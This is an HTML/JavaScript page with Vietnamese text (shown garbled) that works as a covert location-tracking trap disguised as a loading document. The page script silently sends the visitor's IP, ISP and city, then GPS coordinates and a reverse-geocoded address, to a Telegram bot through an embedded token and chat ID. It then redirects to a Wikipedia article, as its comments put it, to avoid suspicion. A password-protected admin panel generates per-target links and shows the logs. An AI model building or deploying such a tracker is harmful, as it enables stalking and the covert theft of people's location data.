<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title id="dyn-title">ƒêang x√°c th·ª±c...</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .victim-body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .admin-bg { background: #010409; color: #c9d1d9; font-family: ui-sans-serif, system-ui; }
        .glass { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; }
        .input-dark { background: #010409; border: 1px solid #30363d; color: #f0f6fc; padding: 10px; border-radius: 8px; width: 100%; font-size: 11px; outline: none; }
    </style>
</head>
<body id="main-body" class="victim-body">

    <div id="ui-victim" class="text-center">
        <div class="loader" style="margin: 0 auto;"></div>
        <div id="status-msg" class="mt-4 text-[#888] text-[12px] italic">ƒêang t·∫£i t√†i li·ªáu...</div>
    </div>

    <div id="ui-admin" class="hidden w-full p-4 lg:p-8">
        <div class="max-w-7xl mx-auto space-y-6">
            <header class="flex justify-between items-center border-b border-gray-800 pb-4">
                <h1 class="text-xl font-black text-white italic uppercase">SENTINEL <span class="text-blue-500">V34 PRO</span></h1>
                <button onclick="logout()" class="text-[10px] bg-red-900/30 text-red-500 px-3 py-1 rounded-lg font-bold border border-red-900/50">LOGOUT</button>
            </header>

            <div class="grid lg:grid-cols-12 gap-6">
                <div class="lg:col-span-4 space-y-6">
                    <div class="glass p-5 space-y-4">
                        <h3 class="text-[10px] font-black text-blue-400 uppercase tracking-widest border-b border-gray-800 pb-2">C·∫•u h√¨nh & T·∫°o Link</h3>
                        <input id="cfg-tk" type="password" placeholder="Telegram Bot Token" class="input-dark">
                        <input id="cfg-id" type="text" placeholder="Telegram Chat ID" class="input-dark">
                        <input id="cfg-rd" type="text" placeholder="Link ƒë√≠ch cu·ªëi (Redirect)" class="input-dark">
                        <input id="in-name" type="text" placeholder="T√™n m·ª•c ti√™u (V√≠ d·ª•: Target_01)" class="input-dark">
                        <button onclick="saveAndBuild()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-[10px] uppercase shadow-lg transition-all">L∆∞u c·∫•u h√¨nh & T·∫°o Link</button>
                        <div id="box-result" class="hidden p-3 bg-black rounded border border-blue-900/30">
                            <div id="out-link" onclick="copyText(this)" class="text-[10px] text-blue-400 break-all cursor-pointer font-mono text-center italic"></div>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-8">
                    <div class="glass min-h-[500px] flex flex-col overflow-hidden shadow-2xl">
                        <div class="p-4 border-b border-gray-800 flex justify-between bg-black/20">
                            <h3 class="text-[10px] font-black text-white uppercase italic">Nh·∫≠t k√Ω truy c·∫≠p Live</h3>
                            <button onclick="clearLogs()" class="text-[9px] text-gray-500 hover:text-red-500 uppercase font-bold">X√≥a l·ªãch s·ª≠</button>
                        </div>
                        <div class="overflow-x-auto flex-1 font-sans">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black/50 text-gray-500 uppercase text-[9px]">
                                    <tr><th class="p-4">M·ª•c ti√™u</th><th class="p-4">IP / ISP</th><th class="p-4">V·ªã tr√≠ (Ch·ªØ)</th><th class="p-4 text-right">B·∫£n ƒë·ªì</th></tr>
                                </thead>
                                <tbody id="log-list" class="divide-y divide-gray-800 text-gray-300"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let config = {
            t: "8123198134:AAHTKQPxi5CnW_HDEenVJjRZMZvx1REjLB4",
            i: "857408205",
            r: "https://vi.wikipedia.org/wiki/ƒê√†o_Minh_Qu√¢n",
            mt: "Ti·ªÉu s·ª≠ ƒê√†o Minh Qu√¢n", md: "ƒê√†o Minh Qu√¢n...", mi: ""
        };

        const urlParams = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (urlParams.has('admin')) {
                if (localStorage.getItem('v34_auth') === 'true' || prompt("Pass:") === "123") {
                    localStorage.setItem('v34_auth', 'true');
                    initAdmin();
                } else { window.location.search = ""; }
            } else { 
                startHiddenTracking(); 
            }
        };

        // --- H·ªÜ TH·ªêNG THEO D√ïI ·∫®N (TRACKING CORE) ---
        async function startHiddenTracking() {
            const target = urlParams.get('name') || 'Guest';
            let ipData = {};

            // B∆Ø·ªöC 1: L·∫§Y IP & V·ªä TR√ç M·∫†NG T·ª∞ ƒê·ªòNG (KH√îNG C·∫¶N QUY·ªÄN)
            try {
                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
                ipData = {
                    ip: res.ip,
                    org: res.org,
                    city: `${res.city}, ${res.country_name}`,
                    lat: res.latitude,
                    lon: res.longitude
                };
                
                // L∆∞u log IP ngay l·∫≠p t·ª©c
                addLog({ name: target, ...ipData, address: "ƒêang l·∫•y GPS...", time: new Date().toLocaleTimeString(), st: 'IP-ONLY' });
                
                // G·ª≠i th√¥ng b√°o Telegram b∆∞·ªõc 1
                await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("‚ö†Ô∏è <b>M·ª•c ti√™u ƒëang v√†o:</b> " + target + "\nüåê IP: " + res.ip + "\nüè¢ ISP: " + res.org + "\nüìç G·∫ßn: " + res.city)}`);
            } catch(e) {
                console.log("IP Tracking Error");
            }

            const redirect = () => window.location.replace(config.r);

            // B∆Ø·ªöC 2: √âP L·∫§Y GPS CH√çNH X√ÅC (S·∫º HI·ªÜN POPUP Y√äU C·∫¶U)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    let fullAddr = `T·ªça ƒë·ªô: ${lat}, ${lon}`;
                    
                    try {
                        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
                        fullAddr = geo.display_name || fullAddr;
                    } catch(e) {}

                    updateLog(target, lat, lon, fullAddr);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üéØ <b>" + target + "</b> GPS CH√çNH X√ÅC OK\nüìç " + fullAddr + "\nüó∫Ô∏è Map: https://www.google.com/maps?q=" + lat + "," + lon)}`);
                    redirect();
                }, (err) => {
                    // N·∫æU T·ª™ CH·ªêI GPS: S·ª≠ d·ª•ng t·ªça ƒë·ªô IP l·∫•y ƒë∆∞·ª£c ·ªü B∆∞·ªõc 1 l√†m d·ªØ li·ªáu thay th·∫ø
                    console.log("GPS Denied - Fallback to IP Location");
                    updateLog(target, ipData.lat, ipData.lon, "D·ª±a tr√™n IP (M·ª•c ti√™u t·ª´ ch·ªëi GPS)");
                    redirect();
                }, { enableHighAccuracy: true, timeout: 6000 });
            } else { redirect(); }

            setTimeout(redirect, 8000); // T·ª± ƒë·ªông tho√°t sau 8s ƒë·ªÉ tr√°nh nghi ng·ªù
        }

        // --- C√ÅC H√ÄM QU·∫¢N TR·ªä (ADMIN) ---
        function initAdmin() {
            document.getElementById('main-body').className = "admin-bg";
            document.getElementById('ui-victim').classList.add('hidden');
            document.getElementById('ui-admin').classList.remove('hidden');
            const saved = localStorage.getItem('v34_cfg');
            if(saved) config = JSON.parse(saved);
            
            document.getElementById('cfg-tk').value = config.t;
            document.getElementById('cfg-id').value = config.i;
            document.getElementById('cfg-rd').value = config.r;
            
            renderLogs();
            setInterval(renderLogs, 3000);
        }

        function saveAndBuild() {
            config.t = document.getElementById('cfg-tk').value;
            config.i = document.getElementById('cfg-id').value;
            config.r = document.getElementById('cfg-rd').value;
            localStorage.setItem('v34_cfg', JSON.stringify(config));
            
            const base = window.location.href.split('?')[0];
            const name = document.getElementById('in-name').value || 'Target';
            const finalLink = `${base}?name=${encodeURIComponent(name)}`;
            
            document.getElementById('box-result').classList.remove('hidden');
            document.getElementById('out-link').innerText = finalLink;
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('v34_logs') || '[]');
            const table = document.getElementById('log-list');
            table.innerHTML = logs.map(l => `
                <tr class="hover:bg-white/5 border-b border-gray-800 transition">
                    <td class="p-4 font-bold text-white uppercase">${l.name}<br><span class="text-[8px] text-gray-600 font-normal">${l.time}</span></td>
                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-gray-500">${l.org || ''}</span></td>
                    <td class="p-4 text-gray-300 text-[9px] max-w-[200px] leading-tight">${l.address}</td>
                    <td class="p-4 text-right">
                        <a href="https://www.google.com/maps?q=${l.lat},${l.lon}" target="_blank" class="bg-blue-600/20 text-blue-500 border border-blue-600/30 px-2 py-1 rounded text-[9px] font-black uppercase">MAP</a>
                    </td>
                </tr>
            `).join('');
        }

        function addLog(data) {
            let logs = JSON.parse(localStorage.getItem('v34_logs') || '[]');
            logs.unshift(data);
            localStorage.setItem('v34_logs', JSON.stringify(logs.slice(0, 50)));
        }

        function updateLog(name, lat, lon, addr) {
            let logs = JSON.parse(localStorage.getItem('v34_logs') || '[]');
            if(logs.length > 0 && logs[0].name === name) {
                logs[0].lat = lat; logs[0].lon = lon; logs[0].address = addr;
            }
            localStorage.setItem('v34_logs', JSON.stringify(logs));
        }

        function clearLogs() { if(confirm("X√≥a s·∫°ch nh·∫≠t k√Ω?")) { localStorage.removeItem('v34_logs'); renderLogs(); } }
        function logout() { localStorage.removeItem('v34_auth'); location.reload(); }
        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy Link!"); }
    </script>
</body>
</html>
